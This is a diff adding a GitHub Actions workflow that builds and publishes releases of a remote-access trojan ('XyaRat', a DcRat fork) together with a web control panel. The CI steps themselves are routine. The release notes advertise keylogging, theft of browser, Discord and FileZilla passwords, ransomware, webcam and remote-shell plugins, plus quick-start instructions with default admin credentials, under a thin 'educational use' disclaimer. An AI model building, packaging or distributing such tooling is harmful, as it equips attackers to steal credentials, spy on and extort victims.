@@ -1,0 +1,158 @@
+name: Create Release
+
+on:
+  push:
+    tags:
+      - 'v*.*.*'
+
+jobs:
+  build-and-release:
+    runs-on: windows-latest
+    
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+      with:
+        fetch-depth: 0
+
+    # Install .NET SDK 9.0
+    - name: Install .NET 9.0
+      uses: actions/setup-dotnet@v4
+      with:
+        dotnet-version: '9.0.x'
+      
+    # Install 7Zip PowerShell Module
+    - name: Install 7Zip PowerShell Module
+      shell: powershell
+      run: Install-Module 7Zip4PowerShell -Force -Verbose
+
+    # Add MSBuild to the PATH
+    - name: Setup MSBuild
+      uses: microsoft/setup-msbuild@v2
+
+    # Install NuGet packages
+    - name: Install NuGet Packages
+      run: nuget restore DcRat.sln
+
+    # Build RAT solution
+    - name: Build RAT Solution
+      run: msbuild -nologo -v:m -p:Configuration=Release DcRat.sln
+    
+    # Build WebPanel Backend
+    - name: Build WebPanel
+      run: dotnet publish WebPanel/WebPanel.csproj -c Release -o WebPanel/bin/Release/publish
+    
+    # Build WebPanel Frontend
+    - name: Setup Node.js
+      uses: actions/setup-node@v4
+      with:
+        node-version: '20'
+    
+    - name: Build React Frontend
+      shell: powershell
+      run: |
+        cd WebPanel/ClientApp
+        npm install
+        npm run build
+        
+    # Build Artifact
+    - name: Build Artifact
+      shell: cmd
+      run: call .\ArtifactBuild.cmd
+    
+    # Package WebPanel
+    - name: Package WebPanel
+      shell: powershell
+      run: |
+        Compress-Archive -Path "WebPanel/bin/Release/publish/*" -DestinationPath "WebPanel.zip"
+    
+    # Extract version from tag
+    - name: Get Version
+      id: get_version
+      shell: bash
+      run: echo "VERSION=${GITHUB_REF#refs/tags/}" >> $GITHUB_OUTPUT
+    
+    # Create Release
+    - name: Create Release
+      id: create_release
+      uses: actions/create-release@v1
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      with:
+        tag_name: ${{ github.ref }}
+        release_name: XyaRat ${{ steps.get_version.outputs.VERSION }}
+        body: |
+          ## 🎉 XyaRat ${{ steps.get_version.outputs.VERSION }}
+          
+          ### 📦 What's Included:
+          
+          #### DcRat.zip
+          - **Server (DcRat.exe)**: Main RAT server with GUI
+          - **Client (Client.exe)**: RAT client/stub
+          - **Plugins**: All plugin DLLs
+            - FileManager, ProcessManager, RemoteDesktop
+            - Keylogger, Chat, Shell
+            - Recovery (Browser/Discord/FileZilla passwords)
+            - Ransomware + Decrypter
+            - Audio, Webcam, Fun, Netstat, Registry Editor
+          
+          #### WebPanel.zip
+          - **Modern Web Admin Panel** (ASP.NET Core 9.0 + React 18)
+          - Real-time client monitoring via SignalR
+          - JWT authentication
+          - Dashboard with statistics
+          - Remote file manager
+          - Command execution interface
+          
+          ### 🚀 Quick Start:
+          
+          **RAT Server:**
+          1. Extract `DcRat.zip`
+          2. Run `DcRat.exe`
+          3. Configure port and certificate
+          
+          **WebPanel:**
+          1. Extract `WebPanel.zip`
+          2. Edit `appsettings.json` (JWT secret, database path)
+          3. Run `WebPanel.exe`
+          4. Open browser: `http://localhost:5000`
+          5. Login: `admin` / `admin123`
+          
+          ### ⚠️ Important Notice:
+          This software is for **educational and authorized security testing purposes only**.
+          
+          Unauthorized use of this software for malicious purposes is **illegal** and unethical.
+          
+          ### 🔒 Security:
+          - Change default admin password immediately
+          - Use HTTPS in production
+          - Configure firewall rules
+          - Review security settings
+          
+          ---
+          
+          **Full Changelog**: https://github.com/${{ github.repository }}/compare/v0.0.0...${{ steps.get_version.outputs.VERSION }}
+        draft: false
+        prerelease: false
+        
+    # Upload RAT Package
+    - name: Upload DcRat Package
+      uses: actions/upload-release-asset@v1
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      with:
+        upload_url: ${{ steps.create_release.outputs.upload_url }}
+        asset_path: ./DcRat.zip
+        asset_name: DcRat-${{ steps.get_version.outputs.VERSION }}.zip
+        asset_content_type: application/zip
+    
+    # Upload WebPanel Package
+    - name: Upload WebPanel Package
+      uses: actions/upload-release-asset@v1
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      with:
+        upload_url: ${{ steps.create_release.outputs.upload_url }}
+        asset_path: ./WebPanel.zip
+        asset_name: WebPanel-${{ steps.get_version.outputs.VERSION }}.zip
+        asset_content_type: application/zip
